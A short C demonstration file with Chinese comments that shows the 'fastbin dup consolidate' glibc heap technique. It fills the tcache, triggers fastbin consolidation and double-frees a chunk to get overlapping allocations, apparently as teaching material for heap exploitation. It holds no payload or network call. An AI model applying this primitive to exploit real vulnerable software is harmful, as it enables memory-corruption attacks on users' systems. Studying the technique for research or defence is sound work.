/**
 *  漏洞名称：	fastbin dup consolidate
 *  适用版本：	glibc-2.23 ~ glibc-2.39
 *  漏洞危害：	可以实现chunk的Overlapping
 *  复现环境：	Ubuntu 22.04
 *  编译命令：	gcc -g fastbin_dup_consolidate.c -o fastbin_dup_consolidate
 */

/**
 *  利用条件：	存在double free漏洞
 *  利用思路: 	向fase bin中放入一个chunk
 * 				释放掉他，然后利用consolidate将他分配出来
 * 				再次释放掉他，然后再次分配出来，实现Overlapping
 */
#define DEMO
#include <demo.h>

int main()
{
	printf("创建7个chunk用于填充tcache bin\n");
	u64 tcache[7];
	for (int i = 0; i < 7; i++)
	{
		tcache[i] = MALLOC(0x20);
	}

	printf("创建p1\n");
	u64 p1 = (u64)MALLOC(0x20);

	printf("1.填充tcache bin\n");
	for (int i = 0; i < 7; i++)
	{
		FREE(tcache[i]);
	}

	printf("2.将p1放入fast bin中, 注意chunk后面需要接着top chunk\n");
	FREE(p1);

	printf("3.利用consolidate将p1分配出来\n");
	u64 p2 = (u64)malloc(0x410);

	printf("4.将分配出来的chunk利用p1的double free放回bin中\n");
	FREE(p1);

	printf("5.再次分配出来, 实现Overlapping\n");
	u64 p3 = (u64)malloc(0x410);

	PUT(p2);
	PUT(p3);
	assert(p2 == p3);

	return 0;
}
